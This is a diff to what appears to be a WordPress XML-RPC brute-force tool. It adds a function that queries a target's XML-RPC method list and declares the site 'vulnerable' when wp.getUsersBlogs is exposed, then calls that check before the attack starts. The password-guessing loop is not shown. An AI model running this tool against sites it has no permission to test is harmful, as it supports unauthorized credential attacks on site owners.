@@ -40,6 +40,22 @@ class bcolors:
 #                                         FUNCTIONS                                                   #
 #######################################################################################################
 
+def verify(url): ## verify if target is vulnerable or not
+
+    xmlrpc_methods = "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
+     ## input sys.argv for url in main()
+
+    headers = {"Content-Type": "application/xml"}
+    r = requests.post(url, data=xmlrpc_methods, headers=headers)
+    r.encoding = 'UTF-8'
+    if "wp.getUsersBlogs" in r.text:
+        print(bcolors.OKBLUE + "Target is vulnerable." + bcolors.ENDC)
+    else:
+        print(bcolors.OKGREEN + "Target is NOT vulnerable for Brute Forcing." + bcolors.ENDC)
+        print("wp.GetUsersBlogs is not enabled.")
+        print("Please report any incorrect results on GitHuB or DM on Twitter.")
+        sys.exit(0)
+
 def parse_response(data):
   root = ET.fromstring(data)
   struct_nodes = root.findall(".//struct")
@@ -82,6 +98,7 @@ def main(argv):
   url = argv[1] 
   wordlist = argv[2] 
   user = argv[3] 
+  verify(url)
   
   print(bcolors.OKBLUE + "" + bcolors.ENDC)
   print(bcolors.OKGREEN + """
